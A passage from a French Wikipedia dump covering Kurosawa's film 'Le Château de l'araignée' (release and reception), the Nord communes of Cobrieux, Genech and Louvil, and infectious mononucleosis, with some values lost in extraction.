Le film sort en salles au Japon le 15 janvier 1957, distribué par la Tōhō, et rapporte 198 millions de yens, ce qui en fait le deuxième plus grand succès japonais de 1957, après "L'Empereur Meiji et la Guerre russo-japonaise" de la Shintōhō, qui rapporte 542,91 millions de yens. Aux États-Unis, le film est distribué en version sous-titrée par Brandon Films dans un format de 105 minutes, et sort le 22 novembre 1961.
"Le Château de l'araignée" est le premier film à être projeté au 1er Festival du film de Londres le 16 octobre 1957. Après la projection, Akira Kurosawa assiste à une fête chez la critique de cinéma Dilys Powell, et dîne avec l'acteur Laurence Olivier et l'actrice Vivien Leigh, qui prévoient de jouer Macbeth et Lady Macbeth dans un projet d'adaptation cinématographique qui ne se matérialisera jamais. Olivier dit à Kurosawa qu'il a apprécié regarder le film et est impressionné par la scène où le Macbeth de Toshirō Mifune est transpercé de flèches. Le jeu d'actrice d'Isuzu Yamada impressionne Leigh, et elle demande pourquoi elle fait si peu de mouvements lorsqu'elle est en colère.
En 1991, le film sort aux États-Unis sur LaserDisc par The Criterion Collection, et sur VHS par . La Tōhō sort le film sur DVD au Japon en 2002 et sur Blu-ray en 2010. En 2013, Madman Entertainment distribue le film sur DVD en Région 4. En région A, The Criterion Collection sort le film sur Blu-ray en 2014, après l'avoir sorti sur DVD 10 ans plus tôt.
En 2018, le film est projeté par le National Film Archive of Japan lors de l'événement "Essential 2018 National Film Archive Opening Cinema Memorial" dans le quartier de Kyōbashi à Tokyo, avec 9 autres films japonais. En 2021, le Kawakita Memorial Film Institute projette une version 4K remasterisée du film lors du 12e Festival du Film de 10 heures.
Accueil.
Critique.
Sur l'agrégateur de critiques Rotten Tomatoes, le film a un taux d'approbation de 96% basé sur 47 critiques, avec une note moyenne de 8,80/10. Le consensus du site déclare : « Un sommet de carrière pour Akira Kurosawa - et l'une des meilleures adaptations cinématographiques d'une pièce de Shakespeare ».
Lors de sa sortie aux États-Unis en 1961, la critique du "Time" loue Kurosawa et le film comme « une descente visuelle dans l'enfer de la cupidité et de la superstition ».
Bosley Crowther du "New York Times" qualifie l'idée de Shakespeare en version japonaise d'« amusante » et complimente la photographie. La plupart des critiques affirment que ce sont les visuels qui comblent le vide laissé par la suppression de la poésie de Shakespeare.
Les réalisateurs britanniques et Peter Brook considèrent le film comme un chef-d'œuvre, mais nient qu'il s'agisse d'un film de Shakespeare en raison de la langue. L'historien du cinéma Donald Richie qualifie le film de « miracle parce qu'il est fait de si peu : brouillard, vent, arbres, brume ». Le critique de cinéma Stephen Prince compare ses paysages minimalistes à la technique de peinture du "sumi-e".
David Parkinson du magazine "Empire" lui attribue une note de 5 sur 5, le qualifiant de « très cinématographique » et de « film parsemé de magnifiques scènes ».
Le film reçoit des éloges de la part des critiques littéraires malgré les nombreuses libertés qu'il prend avec la pièce originale. Le critique littéraire américain Harold Bloom juge qu'il s'agit de « la version cinématographique la plus réussie de "Macbeth" ». écrit qu'il capture "Macbeth" en tant que guerrier fort, et que « Sans se soucier de la fidélité à l'original », "Le Château de l'araignée" est « beaucoup plus satisfaisant » que la plupart des films de Shakespeare. L'historien du cinéma David A. Conrad écrit que, tout comme la pièce de Shakespeare commente sur « les questions de légitimité, de masculinité et de guerre civile » qui résonnent dans l'Angleterre du début du XVIIe siècle, le film de Kurosawa s'engage dans les débats contemporains japonais sur la « toile d'araignée sans araignée » de la bureaucratie et de l'industrie d'après-guerre. Dans son "Movie Guide", Leonard Maltin donne au film quatre étoiles, le qualifiant d'« adaptation graphique et puissante ».
Postérité.
Le film de 1960 d'Akira Kurosawa, "Les salauds dorment en paix", est fortement influencé par "Hamlet" de William Shakespeare, ainsi que par "Le Comte de Monte-Cristo" d'Alexandre Dumas. Le film de 1971 de Roman Polanski, "Macbeth", présente des similitudes avec "Le Château de l'araignée", notamment dans les plans de personnages sur des routes sinueuses, la conception des décors et la musique pour identifier les lieux et les conditions psychologiques. La scène de la mort de Toshirō Mifune est la source d'inspiration pour la scène de la mort de Piper Laurie dans le film de 1976 "Carrie au bal du diable", où des couteaux sont lancés sur elle, dans ce cas par le personnage Carrie White utilisant ses pouvoirs psychiques. En 1985, Kurosawa revient à l'adaptation d'une œuvre de Shakespeare, choisissant la pièce "Le Roi Lear" pour son dernier film épique "Ran", et déplace à nouveau l'action dans le Japon féodal.
"Le Château de l'araignée" est référencé dans l'anime "Millennium Actress" (2001) sous la forme de l'Esprit de la Forêt/Sorcière. Il est adapté sur les planches par le metteur en scène , et est présenté en première au de 2010 à Ashland.

</doc>
<doc id="191994" url="https://fr.wikipedia.org/wiki?curid=191994" title="Cobrieux">
Cobrieux

Cobrieux est une commune française située dans le département du Nord, en région Hauts-de-France.
Géographie.
Au sud de Cysoing. Sur un petit ruisseau qui se jette dans la Marque.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par la Bertellerie et la Gare.
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Marque Deûle ». Ce document de planification concerne un territoire de de superficie, délimité par les bassins versants de la Marque et de la Deûle, formant une vaste cuvette sédimentaire de de long et de de large, où la pente est très faible. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est la Métropole européenne de Lille.
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Lesquin à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Cobrieux est catégorisée commune rurale à habitat dispersé, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Bachy, une agglomération intra-départementale regroupant trois communes, dont elle est une commune de la banlieue. Par ailleurs la commune fait partie de l'aire d'attraction de Lille (partie française), dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de ou plus (hors Paris).
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (78,2 % en 2018), en augmentation par rapport à 1990 (77 %). La répartition détaillée en 2018 est la suivante : 
terres arables (50,1 %), prairies (28,1 %), zones urbanisées (11 %), forêts (10,8 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Histoire.
Autrefois, Cobrieux était le siège d'une commanderie de Malte, nommée de Haute-Avesnes. Elle consistait en la 
seigneurie, en une maison occupée par le commandeur, et une petite église dite le Temple. La maison n'existe plus. Les archives de la commune contiennent des documents sur cette commanderie.
Politique et administration.
Instances judiciaires et administratives.
La commune relève du tribunal d'instance de Lille, du tribunal de grande instance de Lille, de la cour d'appel de Douai, du tribunal pour enfants de Lille, du tribunal de commerce de Tourcoing, du tribunal administratif de Lille et de la cour administrative d'appel de Douai.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 30,0 %, soit en dessous de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 25,8 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 54,06 % de femmes, largement supérieur au taux départemental (51,77 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.

</doc>
<doc id="191995" url="https://fr.wikipedia.org/wiki?curid=191995" title="Mononucléose infectieuse">
Mononucléose infectieuse

La mononucléose infectieuse (MNi) correspond à la primo-infection symptomatique, provoquée par le virus d'Epstein-Barr (couramment abrégé en EBV d'après la terminologie anglophone), qui appartient à la même famille que les virus de l’herpès et de la varicelle. Transmise préférentiellement par la salive, on l'appelle , mais il s'agit le plus souvent de gouttelettes, comme la plupart des virus et bactéries. Cette affection fréquente se caractérise par une lymphocytose lympho-plasmo-monocytaire (c'est-à-dire un excès de cellules sanguines mononucléaires, d'où le terme "mononucléose") et une réaction sérologique de Paul-Bunnel-Davidsohn positive. On considère de plus en plus que le suivi des anticorps de l'EBV (IgM et IgG) permet de conclure à une MNI si les autres symptômes typiques sont associés chez une personne sans défaillance de son immunité.
Les différents synonymes pour cette maladie sont : adénolymphoïdite aiguë bénigne, angine monocytaire, lymphoblastose bénigne, monocytose aiguë.
Épidémiologie.
Il s'agit d'une infection extrêmement fréquente, près de 95 % des adultes dans le monde possédant les stigmates biologiques d'une ancienne infection. Près de la moitié des contaminations ont lieu avant l'âge de cinq ans, mais cette proportion a tendance à diminuer avec le temps dans les pays développés compte tenu des conditions d'hygiène. Chez un sujet sur deux, la maladie passe inaperçue (ou faible asthénie) alors que les anticorps EBV témoignent d'une contamination ancienne.
Lorsqu'elle se développe, la maladie est plus marquée chez l'adulte que chez l'enfant.
Transmission.
Elle se transmet par la salive, d’où son surnom de . . Elle peut aussi se transmettre, exceptionnellement, par transfusion sanguine. En général, la contamination se produit dans l’enfance, au moment de l’adolescence ou chez les jeunes adultes (20-30 ans).
À 40 ans, on estime que 90 % des adultes sont porteurs du virus EBV et que 20 à 30 % sont excréteurs asymptomatiques du virus.
La mononucléose peut se transmettre par des échanges de baisers, par des verres mal nettoyés, par des couverts contaminés, par des postillons salivaires, et par les jouets qui passent de bouche en bouche chez les enfants.
Des études ont montré qu’on peut retrouver des anticorps contre le virus d'Epstein-Barr, chez environ la moitié des enfants de 4 à . Ces enfants ont donc bien été infectés mais sans symptômes remarquables et sont immunisés.
Le virus se reproduit dans les cellules de l'amygdale ainsi que dans les lymphocytes B où il reste quiescent. L'excrétion virale est variable dans le temps et peut persister à vie.
Symptômes.
La durée d'incubation est d'un à deux mois.
La maladie se caractérise par la grande variabilité des signes et de sa gravité. Elle est en général assez bénigne. Le début est souvent insidieux : les premiers jours, le sujet se plaint de malaises, d’anorexie, de légères céphalées, de frissons avec fébricules, un peu comme dans une infection de la maladie grippale.
Chez les adolescents et les jeunes adultes, l’infection par le virus Epstein-Barr s’accompagne d’une "altération importante de l’état général" :
fièvre qui n’a rien de caractéristique, ni au point de vue de son élévation (), ni de son évolution pendant le jour (rémittente ou continue, elle finit par descendre), grande fatigue, perte d’appétit, ganglions gonflés au cou surtout, aux aisselles et à l’aine mais habituellement indolores (au départ), angine rouge, bilatérale classiquement (mais pas systématiquement), symétrique, non ulcéreuse et non hémorragique, difficultés à garder le sommeil plus de 2-, douleurs musculaires, maux de tête, mal de gorge plus ou moins important, troubles respiratoires liés à l’hypertrophie de ganglions, et même augmentation de la taille de la rate (splénomégalie, parfois douloureuse) et jaunisse, des atteintes méningées, nerveuses ou cardiaques ou des réactions auto-immunes.
Il existe aussi parfois une éruption qui est localisée au tronc et à la racine des jambes et des bras. Cette éruption est parfois spontanée mais le plus souvent déclenchée par la prise d’amoxicilline (antibiotique souvent prescrit en cas d’angine). Il ne s’agit pas d’une réelle allergie à cet antibiotique mais d’une réaction spécifique dans le cas de l’infection à EBV. Lors de la prise d'ampicilline, ce rash s'observe dans 80 % des cas, une fois la primo-infection déclarée. Parfois, la prise d'ampicilline a lieu un peu en amont de MNI, traitement d'un début d'angine par exemple, et ne conduit pas toujours à l'apparition du rash.
L'évolution se fait vers la guérison des symptômes en un mois environ (sauf complications). Les adénopathies et la fatigue peuvent persister plus longtemps mais, la plupart du temps, cèdent en 2 à 3 mois. L'asthénie peut également perdurer au-delà de 3 mois, ce qui invalide parfois le malade dans les activités quotidiennes (cas des formes aiguës ou avec complications notamment chez l'adulte), l'hémogramme redevient normal entre 1 et 3 mois après la maladie.
Diagnostic.
Le diagnostic est évoqué devant la présence de signes cliniques et devant une modification de l'hémogramme, montrant un syndrome mononucléosique ; le terme « inversion de la formule sanguine », plus imprécis, est parfois également rencontré. Le diagnostic est confirmé par la mise en évidence d'anticorps spécifiques contre le virus avec des tests sérologiques.
Le premier test réalisé est le « MNI test » qui est sensible et qui permet de détecter de façon large les personnes récemment contaminées (il est positif dans 80 % des cas en cas d’infection récente). Ce test produit dans 3 % des cas des faux positifs (test positif alors qu’il n’y a pas d’infection). Ce premier test doit être complété par un test de confirmation :
Ces tests sont essentiellement indiqués pour la surveillance d'une réactivation du virus chez des sujets aux défenses immunitaires affaiblies ou pour diagnostiquer un début de MNI lorsque les symptômes ne sont pas nets.
Complications.
Les principaux organes qui peuvent être touchés par le virus Epstein-Barr sont : le cerveau (encéphalite, méningite), cœur (myocardite), poumon (pneumonie), rein (néphrite), foie (hépatomégalie, lyse cellulaire, hépatite virale), etc. Lorsqu’elles sont prises en charge correctement, ces complications sont de bon pronostic et régressent en quelques jours. Dans certains cas (plutôt rares et associés à d’autres facteurs génétiques ou environnementaux par exemple), ce virus peut être cancérigène. Ce qui est vrai pour des patients immuno-déprimés notamment et ne se voit que très exceptionnellement chez les adolescents ou les jeunes adultes (25-30 ans).
En phase aiguë de l’infection, la rupture de la rate est également une complication rare mais très classique de cette maladie. C'est pourquoi il faut veiller à ne pas porter de charge lourde lorsque l'on est atteint par la mononucléose.
La mononucléose infectieuse est parfois responsable de complications sanguines : anémie (rare) par destruction accélérée des globules rouges (on parle d’anémie hémolytique), purpura thrombocytopénique (diminution du nombre de plaquettes responsable d’une anomalie de coagulation du sang et de petites taches rouges ou violacées sur le corps), cryoglobulinémie.
Très rarement, le virus d’Epstein-Barr peut être responsable d’un syndrome d’activation des macrophages : certaines cellules (macrophages) détruisent en partie les cellules de la moelle osseuse et sont responsables de la baisse de toutes les lignées de cellules sanguines (globules rouges, blancs et plaquettes, appelé « pancytopénie »).
La mononucléose infectieuse peut également évoluer de façon chronique (syndrome de fatigue chronique). Outre cette fatigue constamment présente, on peut noter des douleurs (maux de tête, douleurs de gorge, douleurs musculaires ou articulaires), des troubles neurologiques et psychologiques (troubles visuels, troubles de la mémoire, irritabilité excessive, troubles de concentration, dépression), une fièvre prolongée à 37,5 – , un amaigrissement modéré, des ganglions douloureux ou sensibles au toucher (même si ce n'est pas toujours le cas au cours de la maladie).
Le virus EBV est également associé à un risque plus élevé d’apparition de certains cancers : cancers du nasopharynx et lymphomes (lymphome de Burkitt ou à ). Ces cancers sont très rares dans la population, mais sont plus souvent retrouvés chez les personnes porteuses du virus EBV que chez les autres. La maladie de Hodgkin (LH) voit également un virus EBV présent dans 40 % des cas, mais avec des taux d'anticorps Anti VCA très au-delà des valeurs conventionnellement observées, les patients ayant souvent contracté un EBV dans les mois qui ont précédé la découverte du LH. En outre, les symptômes associés sont différents de ceux observés lors de la MNI.
Le fait de contracter la maladie durant l'adolescence ou chez l'adulte jeune doublerait le risque de survenue ultérieure de sclérose en plaques.
En cas de complications des examens supplémentaires sont indispensables : test sanguins (test de Coombs pour rechercher une destruction des globules rouges, tests hépatiques pour apprécier la fonction du foie), myélogramme pour l’étude des cellules de la moelle osseuse, biopsie d’un ganglion en cas de doute sur le diagnostic (rare).
Traitement et convalescence.
La mononucléose infectieuse est une maladie bénigne, mais elle nécessite souvent une longue convalescence du fait de la fatigue (asthénie) qui persiste de plusieurs semaines à plusieurs mois. Aucun antibiotique n’influence le cours de la maladie. L'intérêt d'un traitement antiviral n'est pas démontré.
Il n’existe pas de traitement spécifique, mais on peut prendre des antalgiques mis à part l’aspirine (déconseillée dans le cas d’infections virales pour les enfants de moins de car elle peut provoquer le syndrome de Reye, affection rare mais souvent mortelle). Pour contrôler la fièvre, qui peut dépasser les , et soulager les douleurs, le repos s’impose, mais s’il y a un risque de complications (fièvre persistante, atteinte hépatique) une hospitalisation peut être envisagée.
En cas de surinfection de l’angine par un streptocoque, le recours aux antibiotiques sera nécessaire, mais en évitant les dérivés de la pénicilline (ampicilline), car ceux-ci peuvent provoquer une éruption cutanée et peuvent accentuer les symptômes de la maladie (dans 80 % des cas environ, on n'observe pas toujours de rash).
Si la symptomatologie est agressive, on peut faire régresser les manifestations (haute température, hépatite, ictère hémolytique ou complications nerveuses) par un bref traitement à la prednisone (5 à ) et doit nécessiter la recherche parallèle d'une hépatite réactionnelle due à l'infection par EBV, obligeant à stopper l'administration des corticoïdes. L'intérêt de l'utilisation des corticoïdes dans les formes bénignes n'est pas établi.
Les premiers essais vaccinaux montrent qu'il n'y a pas de protection contre la contamination mais qu'il existe une diminution des symptômes.

</doc>
<doc id="191996" url="https://fr.wikipedia.org/wiki?curid=191996" title="Genech">
Genech

Genech (prononcé ; "Genst" en flamand) est une commune française, située dans le Pays de Pévèle, dans le département du Nord, dans la région Hauts-de-France.
Géographie.
Genech est proche de la communauté urbaine de Lille Métropole, dans 500 hectares de nature, dont une grande partie boisée, pour une superficie totale de 736 hectares.
Elle est en effet à environ 15 km au sud-est de Lille, 
Distance par la route d'autres villes : 
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par le Zecart, le Courant des Planches, le Moulin d'Eau et divers autres petits cours d'eau.
Le Zécart, d'une longueur de , prend sa source dans la commune de Bersée et se jette dans la Marque à Templeuve-en-Pévèle, après avoir traversé .
Gestion et qualité des eaux.
Le territoire communal est couvert par le schéma d'aménagement et de gestion des eaux (SAGE) « Marque Deûle ». Ce document de planification concerne un territoire de de superficie, délimité par les bassins versants de la Marque et de la Deûle, formant une vaste cuvette sédimentaire de de long et de de large, où la pente est très faible. Le périmètre a été arrêté le et le SAGE proprement dit a été approuvé le . La structure porteuse de l'élaboration et de la mise en œuvre est la Métropole européenne de Lille.
La qualité des cours d'eau peut être consultée sur un site dédié géré par les agences de l'eau et l'Agence française pour la biodiversité.
Climat.
Plusieurs études ont été menées afin de caractériser les types climatiques auxquels est exposé le territoire national. Les zonages obtenus diffèrent selon les méthodes utilisées, la nature et le nombre des paramètres pris en compte, le maillage territorial des données et la période de référence. En 2010, le climat de la commune était ainsi de type climat océanique dégradé des plaines du Centre et du Nord, selon une étude du Centre national de la recherche scientifique (CNRS) s'appuyant sur une méthode combinant données climatiques et facteurs de milieu (topographie, occupation des sols) et des données couvrant la période 1971-2000. En 2020, le climat prédominant est classé Cfb, selon la classification de Köppen-Geiger, pour la période 1988-2017, à savoir un climat tempéré à été frais sans saison sèche. Par ailleurs Météo-France publie en 2020 une nouvelle typologie des climats de la France métropolitaine dans laquelle la commune est exposée à un climat océanique et est dans la région climatique Nord-est du bassin Parisien, caractérisée par un ensoleillement médiocre, une pluviométrie moyenne régulièrement répartie au cours de l’année et un hiver froid (). Elle est en outre dans la zone H1a au titre de la réglementation environnementale 2020 des constructions neuves.
Pour la période 1971-2000, la température annuelle moyenne est de , avec une amplitude thermique annuelle de . Le cumul annuel moyen de précipitations est de , avec de précipitations en janvier et en juillet. Pour la période 1991-2020, la température moyenne annuelle observée sur la station météorologique de Météo-France la plus proche, sur la commune de Lesquin à à vol d'oiseau, est de et le cumul annuel moyen de précipitations est de . .
Urbanisme.
Typologie.
Au , Genech est catégorisée bourg rural, selon la nouvelle grille communale de densité à sept niveaux définie par l'Insee en 2022.
Elle appartient à l'unité urbaine de Genech, une unité urbaine monocommunale constituant une ville isolée. Par ailleurs la commune fait partie de l'aire d'attraction de Lille (partie française), dont elle est une commune de la couronne. Cette aire, qui regroupe , est catégorisée dans les aires de ou plus (hors Paris).
Occupation des sols.
L'occupation des sols de la commune, telle qu'elle ressort de la base de données européenne d'occupation biophysique des sols Corine Land Cover (CLC), est marquée par l'importance des territoires agricoles (70,5 % en 2018), en diminution par rapport à 1990 (73,9 %). La répartition détaillée en 2018 est la suivante : 
terres arables (46,2 %), prairies (23,5 %), zones urbanisées (21 %), forêts (8,5 %), zones agricoles hétérogènes (0,8 %). L'évolution de l'occupation des sols de la commune et de ses infrastructures peut être observée sur les différentes représentations cartographiques du territoire : la carte de Cassini (), la carte d'état-major (1820-1866) et les cartes ou photos aériennes de l'IGN pour la période actuelle (1950 à aujourd'hui).
Voies de communication et transports.
Genech est desservie par les lignes 870, 871 et 889 du réseau interurbain Arc-en-Ciel 2.
Des bus scolaires en provenance des communes voisines et à destination du lycée Charlotte Perriand et de l'Institut desservent également la commune.
La gare de Genech qui fut construite au début du siècle et toujours desservie aujourd'hui, mais il n'y a ni possibilité de s'abriter ni de se restaurer car la gare fut murée en 1997 à cause des squatteurs qui la dégradaient. Aujourd'hui, c'est un Point d'Arrêt Non-Géré (PANG) sur la ligne de Somain à Halluin (ligne TER Hauts-de-France Orchies &gt; Ascq).
Histoire.
Avant 1789.
Pévèle vient du gallo-romain "Pabula", dérivé de "Pabulus", qui signifie pâturages.
L'étymologie du nom de Genech, vient d'un mot grec "guné" (femme) qui donne gynécée, d'où "genech" par corruption. Gynécée, sous la domination romaine cette appellation était donnée aux ateliers de femmes chargées de la confection des vêtements militaires.
Au Moyen Âge, Genech dépendait de la baronnie de Cysoing domaine de la Couronne de France, donné en dot par Louis le comte Évrard, duc de Frioul et fondateur de l'Abbaye Saint-Calixte de Cysoing.
Genech est le siège d'une seigneurie, détenue à partir du par les Saint-Aldegonde.
Maximilien de Sainte-Aldegonde, seigneur de Genech, restaure vers 1600 le château en partie détruit par un incendie. Il y meurt en 1635.
Vers 1670, Albert-André de Sainte-Aldegonde est baron de Maingoval et seigneur de Genech. Il a épousé 1) Agnès le Machon de Sauch, 2) Anne d'Ongnies (sans doute Oignies). Leur fils Baltazar de Sainte-Aldegonde, écuyer, nait à Genech, devient bourgeois de Lille le , épouse le à Lille Marie Thérèse Françoise de Lannoy (1682-1764), fille de Jean Baptiste François Olivier de Lannoy, chevalier, seigneur de Salomé, bourgeois de Lille , grand bailli de Furnes et de Françoise Henriette de Tramecourt.
Balthazar-Alexandre de Saint-Aldegonde, comte de Genech, prend pour femme Marie-Jacqueline-Alexandrine d'Ennetières. Il épouse ensuite en 1750 Marie-Françoise Libert (1717-1758), dame de Quartes, veuve de Charles-Julien Bidé de la Grandville (1717-1747). Née le , elle meurt à Paris le .
François-Balthazar-Ignace-Ghislain (1734-1808), comte de Sainte Aldegonde de Noircames, est seigneur de Genech, baron de Rosimbos (sur Fournes-en-Weppes), fils de Balthazar-Alexandre et de Marie-Jacqueline-Alexandrine d'Ennetières. Il nait en 1734, devient mestre de camp d'un régiment de cavalerie portant son nom (Régiment de Sainte-Aldegonde cavalerie), incorporé dans celui de la reine (Régiment de La Reine cavalerie) en 1762, passe maréchal de camp par brevet du mars 1780. Il meurt à Tournai le 21 mai 1808, est enterré à Ascq. Il épouse à Lille le , Marie-Albertine-Amélie Bady (1739-1826), fille de Pierre-Joseph Bady, seigneur d'Aymeries, de Pont, bourgeois de Lille, grand bailli de la ville de Lille, et de Marie-Albertine-Amélie Jacops, dame d'Ascq, baptisée à Lille Saint-Maurice le août 1839, morte à Tournai le 9 mars 1826, enterrée à Ascq. Le couple laissa une postérité.
Avant la Révolution, Genech est un village agricole écoulant ses produits vers l'agglomération lilloise et en 1549 l'« assiette de l'impôt » indique 118 foyers, 262 mesures de labours, 186 mesures de prés, bois, viviers, 1 moulin à blé, 28 chevaux, 223 vaches, 145 moutons.
Période contemporaine.
Quelques dates : 1853, 1157 habitants, 1872 : création de la gare de Genech. 1894 : fondation de l'école d'agriculture, d'abord centre d'initiation agricole et qui devint très vite un véritable institut d'enseignement théorique et pratique.
L'industrie s'est installée et on compte à la fin du : 2 tissages, 1 tannerie, 1 brasserie, 1 malterie, 2 moulins ; mais une partie de la population travaille néanmoins à Roubaix-Tourcoing ou Lille.
1945 :inauguration de la nouvelle mairie
Politique et administration.
Liste des maires.
Roger Catteau, cadre publicitaire retraité, a été conseiller régional du Nord-Pas-de-Calais.
Maire en 1802-1803 : Louis Lebacq.
Maire en 1807-1808 : Martinache.
Maire en 1881 : Delezennes.
Instances judiciaires et administratives.
La commune relève du tribunal d'instance de Lille, du tribunal de grande instance de Lille, de la cour d'appel de Douai, du tribunal pour enfants de Lille, du tribunal de commerce de Tourcoing, du tribunal administratif de Lille et de la cour administrative d'appel de Douai.
Population et société.
Démographie.
Pyramide des âges.
La population de la commune est relativement jeune.
En 2018, le taux de personnes d'un âge inférieur à s'élève à 43,4 %, soit au-dessus de la moyenne départementale (39,5 %). À l'inverse, le taux de personnes d'âge supérieur à est de 18,2 % la même année, alors qu'il est de 22,5 % au niveau départemental.
En 2018, la commune comptait pour , soit un taux de 51,88 % d'hommes, largement supérieur au taux départemental (48,23 %).
Les pyramides des âges de la commune et du département s'établissent comme suit.
Enseignement.
La commune comprend notamment :
Lieux et monuments.
Le château de Genech.
Le château de Genech fut construit dès le .
Sa chapelle aurait abrité, jusqu'à la Révolution, une relique insigne : la tête de sainte Hélène, la mère de l'empereur Constantin.
En partie détruit par un incendie, il fut restauré vers 1600 par Maximilien de Sainte-Aldegonde qui y mourut en 1635. Son fils demeura au château. Celui-ci fut habité de manière à peu près continue par les seigneurs de Genech jusqu'en 1737.Aux époques troublées le château de Genech servit de refuge aux habitants du village, lorsqu'ils étaient en danger.Le château de Genech fut reconstruit en 1906 par Albert Crespel, industriel lillois, qui meubla le château avec du mobilier venant de la Loire. Il fit aménager le parc et tracer une large allée afin de pouvoir y faire atterrir son avion personnel. En 1939, une tornade emporta la toiture puis, pendant la Seconde Guerre mondiale, le château fut occupé par les Allemands qui causèrent encore bien des déprédations et l'abandonnèrent dans un état pitoyable en 1944. La famille Crespel s'en sépara vers 1950 et l'État s'en rendit acquéreur en 1969.
Le château abrite, depuis 2004, l'administration et le CDI du lycée polyvalent Charlotte-Perriand. Les salles de classe, inaugurées en 2006 en un bâtiment moderne, et l'atelier d'ébénisterie-menuiserie, se trouvent dans ses jardins.
L'église Notre-Dame-de-la-Visitation.
La première mention de l'église de Genech date de 1164.
L'église fut, entièrement reconstruite au milieu du sous l'impulsion de Mathéas de Barbé, abbé de Cysoing (1526-1565). En effet, Genech faisait partie de l'ancien diocèse de Tournai.
Sa vétusté a entraîné une reconstruction quasi totale de l'édifice. Les murs témoignent des remaniements ayant eu lieu de manière économique ; les fenêtres ont notamment été diminuées à l'aide de briques.Le clocher qui se trouve en façade est un exemple du gothique troubadour représentatif de l'époque de la Restauration.
L'église possède une riche série de tableaux datant du . Dans le chœur, le maître-autel et le retable (privé de son tableau en 1900), sont de belles pièces baroques. Les stalles et les boiseries ont été apportées en ce lieu par Albert Crespel, propriétaire du château de Genech.
Dans les nefs latérales, deux autels de bois sculptés du , puis dans les chapelles, deux retables probablement transformés à partir d'œuvres du .
Le tableau le plus beau est un extraordinaire arbre de Jessé, qui est la représentation de la généalogie du Christ d'après les Évangiles.
Le triptyque qui se trouve dans la chapelle de droite représente le sacre de saint Martin, ou saint Nicolas. Sur les volets, est représenté Erasme d'Autel, abbé de Cysoing, en compagnie de son saint patron, puis des miracles de saint Nicolas. Aux revers de ceux-ci, sont présents Évrard de Frioul et son épouse Gisèle, petite-fille de Charlemagne, qui sont à l'origine de l'abbaye de Cysoing, représentés devant la tour de ce monastère en cours de construction (1624). Sont également représentés dans la chapelle de gauche, un Dieu de Pitié, sainte Aldegonde et saint Nicolas.

</doc>
<doc id="191997" url="https://fr.wikipedia.org/wiki?curid=191997" title="Louvil">
Louvil

Louvil est une commune française située dans le département du Nord, en région Hauts-de-France. Elle forme avec quatre autres communes une petite agglomération, l'unité urbaine de Cysoing, qui appartient à l'aire urbaine de Lille.
Géographie.
Localisation.
Louvil est située dans la Pévèle au sud de Lille, dans une campagne calme et verdoyante entre Cysoing et Templeuve-en-Pévèle et la commune de Bouvines, célèbre pour sa bataille ou Genech.
Louvil n'était à l'origine qu'une portion du territoire de Cysoing, et faisait partie, comme Cysoing, de la Pévèle.
Le village de Louvil, limité au Nord et à l'Est par le territoire de Cysoing, au midi par le Courant d'eau dit "Le Long Fossé", qui sépare Louvil de Templeuve et aboutit à la Marque; à l'Ouest par la Marque (rivière).
Topographie, géologie.
Une grande partie de Louvil était formée, jadis, de bois, de pâtures, et de marais. Le reste était en "couture" comme on disait alors, c'est-à-dire en terres labourables.
Au point de vue géologique, Louvil fait partie de la couche argileuse qui s'étend vers Orchies.
Cette argile formée au tertiaire est même désignée par les géologues sous le nom d'argile de Louvil.
Hydrographie.
Réseau hydrographique.
La commune est située dans le bassin Artois-Picardie. Elle est drainée par la Marque, le ruisseau de Cysoing, le Zecart et le Courant des Planches.
La Marque, d'une longueur de , prend sa source dans la commune de Thumeries et se jette dans le canal de Roubaix à Wasquehal, après avoir traversé .
Le Zécart, d'une longueur de , prend sa source dans la commune de Bersée et se jette dans la Marque à Templeuve-en-Pévèle, après avoir traversé .
Gestion et qualité des eaux.
